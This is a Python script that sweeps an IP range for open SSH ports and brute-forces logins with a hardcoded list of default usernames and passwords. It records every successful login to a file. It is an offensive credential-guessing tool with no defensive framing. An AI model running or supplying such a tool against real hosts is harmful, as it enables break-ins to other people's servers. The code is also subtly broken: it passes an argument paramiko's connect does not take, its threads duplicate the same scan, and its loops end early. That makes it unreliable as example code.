import argparse
import socket
import ipaddress
import threading
import paramiko


# Define banner grabbing function
def grab_banner(ip, port):
    banner = ""
    try:
        sock = socket.socket()
        sock.connect((ip, port))
        sock.settimeout(2)
        banner = sock.recv(1024).decode().strip()
    except (socket.timeout, ConnectionRefusedError):
        pass
    finally:
        sock.close()
    return banner


# Define authentication function
def authenticate(ip, username, password, protocol):
    result = False
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        if protocol == "SSH-1.5":
            client.connect(ip, username=username, password=password, port=22, allow_agent=False, look_for_keys=False, banner_timeout=2)
        else:
            client.connect(ip, username=username, password=password, port=22, allow_agent=False, look_for_keys=False, banner_timeout=2, ssh_version=2)
        result = True
    except (paramiko.ssh_exception.AuthenticationException, paramiko.ssh_exception.NoValidConnectionsError, socket.timeout, OSError):
        pass
    finally:
        client.close()
    return result


# Define thread function
def scan_range(ip_range):
    for ip in ipaddress.IPv4Network(ip_range):
        print(f"\n[*] Scanning {ip}")
        banner = grab_banner(str(ip), 22)
        if not banner:
            continue
        print(f"\033[94m[+] Found open port 22 on {ip} ({banner})\033[0m")
        if "SSH-1.5" in banner:
            protocol = "SSH-1.5"
        else:
            protocol = "SSH-2.0"
        for username in ["root", "admin", "ubuntu", "kali"]:
            passwords = ["root", "kali", "123456", "qwerty", "debian", "admin"]
            for i in range(2):
                if i == 1:
                    passwords = ["qwerty", "debian", "admin"]
                for password in passwords:
                    if authenticate(str(ip), username, password, protocol):
                        print(f"\033[92m[+] Successfully authenticated with {username}:{password} on {ip}\033[0m")
                        with open("successful-logins.txt", "a") as f:
                            f.write(f"{ip},{username},{password}\n")
                        break
                if authenticate(str(ip), username, password, protocol):
                    break
                
            if username != "root":
                break


# Main function
def main():
    # Parse command line arguments
    parser = argparse.ArgumentParser(description="Scan an IP range for open SSH ports and attempt to authenticate")
    parser.add_argument("range", help="IP range in CIDR, hyphenated, or dotted decimal format")
    args = parser.parse_args()
    
    # Scan IP range using 10 threads
    ip_range = args.range
    threads = []
    for i in range(10):
        t = threading.Thread(target=scan_range, args=(ip_range,))
        threads.append(t)
        t.start()
    for t in threads:
        t.join()


if __name__ == "__main__":
    main()
